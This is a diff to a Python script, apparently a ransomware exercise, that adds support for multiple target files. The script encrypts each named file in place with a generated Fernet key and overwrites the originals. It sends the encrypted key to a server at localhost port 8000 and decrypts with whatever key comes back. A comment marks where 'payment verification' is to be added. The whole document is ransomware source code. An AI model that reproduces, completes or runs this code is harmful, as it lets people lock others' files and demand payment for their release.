@@ -47,20 +47,20 @@ def decryptFile(filePath, key):
 # over the encrypted key. It then receives back the encrypted key and calls the 
 # decryptFile function
 
-def sendEncryptedKey(eKeyFilePath):
+def sendEncryptedKey(eKeyFilePath, file_path):
     hostname, port = "127.0.0.1", 8000
     with socket.create_connection((hostname, port)) as sock:
         with open(eKeyFilePath, "rb") as file:
             encrypted_symmetric_key = file.read()
             sock.sendall(encrypted_symmetric_key)
             returned_key = sock.recv(1024)
-            decryptFile(filePath, returned_key)
+            for file in file_path:
+                decryptFile(file, returned_key)
 
 
 # FUNCTION      : parse_host_port
 # DESCRIPTION   : this function will parse the IPendpoint to useable data
 #  
-
 def parse_host_port(ip_port):
     try:
         ip = ipaddress.ip_address(ip_port[0])
@@ -78,8 +78,8 @@ def parse_host_port(ip_port):
            
         except ValueError:
             raise ValueError("Invalid host:port '%s", ip_port)
- 
 
+    
 if __name__ == "__main__":
 
 
@@ -92,7 +92,7 @@ if __name__ == "__main__":
     
     parser = argparse.ArgumentParser()
     
-    parser.add_argument('-f', '--file', required=True, help="File to encrypt") # will also need to make this multiple files!
+    parser.add_argument('-f', '--file', nargs='+', required=True, help="File to encrypt") # nargs allows for multiple file names
     parser.add_argument('-c', '--configipendpoint',required=True, help="IP/Port; Accepted format is: 'ip:port'")
 
 
@@ -101,10 +101,15 @@ if __name__ == "__main__":
     allargs = AttrDict(allargs)
     
     #parse the IPEndpoint
-    if allargs.file is not None:
+    if allargs.configipendpoint is not None:
         ip_port = args.configipendpoint.rsplit(":", 1)
-        parse_host_port(ip_port)
-        
+        parse_host_port(ip_port) #MAYBE HERE I CAN PROMPT THE USER TO ENTER A NEW IPENDPOINT? OR JUST END THE
+    
+    file_to_encrypt = allargs.file
+    
+    
+    #once i get a list of file paths, i will need to capture the enycrpting part in a foreach loop.   
+    print(file_to_encrypt)
         
     # This line generates a Fernet key
     symmetricKey = Fernet.generate_key()
@@ -132,23 +137,23 @@ if __name__ == "__main__":
     with open("encryptedSymmertricKey.key", "wb") as key_file:
         key_file.write(encryptedSymmetricKey)
 
-    filePath = ".\File1.txt"
+    for x in file_to_encrypt: 
     # open the file that is to be encrypted... and encrypt it
-    with open(filePath, "rb") as file:
-        file_data = file.read()
-        encrypted_data = FernetInstance.encrypt(file_data)
-
+        with open(x , "rb") as file:
+            file_data = file.read()
+            encrypted_data = FernetInstance.encrypt(file_data)
     # write the encrypted file back to the filepath, overwriting the information 
     # with encyption
-    with open(filePath, "wb") as file:
-        file.write(encrypted_data)
+        with open(x , "wb") as file:
+            file.write(encrypted_data)
     # load up the encrypted key to send to the server that is running. 
-        eKeyFilePath = ".\encryptedSymmertricKey.key"
+    
+    eKeyFilePath = ".\encryptedSymmertricKey.key"
     # Create the variables for host/port
 
     #THIS IS WHERE We need to add the payment verification.
 
 
-    sendEncryptedKey(eKeyFilePath)
+    sendEncryptedKey(eKeyFilePath, file_to_encrypt)
 
     quit()
